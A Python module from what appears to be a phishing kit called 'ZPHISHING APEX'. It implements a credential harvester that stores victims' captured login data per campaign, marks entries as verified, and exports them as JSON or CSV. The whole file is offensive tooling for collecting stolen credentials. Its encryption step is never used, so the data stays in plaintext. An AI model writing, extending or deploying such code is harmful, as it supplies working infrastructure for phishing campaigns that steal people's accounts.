#!/usr/bin/env python3
"""
ZPHISHING APEX — Credential Harvester
"""

import os
import json
import time
import hashlib
from typing import Dict, List, Optional
from dataclasses import dataclass

@dataclass
class CapturedCredential:
    id: str
    campaign_id: str
    data: Dict
    timestamp: float
    verified: bool

class CredentialHarvester:
    def __init__(self, db, crypto):
        self.db = db
        self.crypto = crypto
        self.captured = []

    def capture(self, campaign_id: str, data: Dict, request_info: Dict) -> str:
        """Capture credentials"""
        credential_id = hashlib.md5(
            f"{campaign_id}{data.get('email', 'unknown')}{time.time()}".encode()
        ).hexdigest()[:12]

        # Encrypt sensitive data
        encrypted = self.crypto.encrypt(json.dumps(data))

        credential = CapturedCredential(
            id=credential_id,
            campaign_id=campaign_id,
            data=data,
            timestamp=time.time(),
            verified=False
        )

        self.captured.append(credential)
        return credential_id

    def get_captured(self, campaign_id: Optional[str] = None) -> List[Dict]:
        """Get captured credentials"""
        result = self.captured
        if campaign_id:
            result = [c for c in result if c.campaign_id == campaign_id]

        return [{
            'id': c.id,
            'campaign_id': c.campaign_id,
            'data': c.data,
            'timestamp': c.timestamp,
            'verified': c.verified
        } for c in result]

    def verify(self, credential_id: str) -> bool:
        """Verify captured credential"""
        for c in self.captured:
            if c.id == credential_id:
                c.verified = True
                return True
        return False

    def export(self, format: str = 'json') -> str:
        """Export captured credentials"""
        if format == 'json':
            return json.dumps([{
                'id': c.id,
                'campaign_id': c.campaign_id,
                'data': c.data,
                'timestamp': c.timestamp,
                'verified': c.verified
            } for c in self.captured], indent=2)
        elif format == 'csv':
            import csv
            import io
            output = io.StringIO()
            writer = csv.writer(output)
            writer.writerow(['ID', 'Campaign ID', 'Data', 'Timestamp', 'Verified'])
            for c in self.captured:
                writer.writerow([c.id, c.campaign_id, json.dumps(c.data), c.timestamp, c.verified])
            return output.getvalue()
        return ''
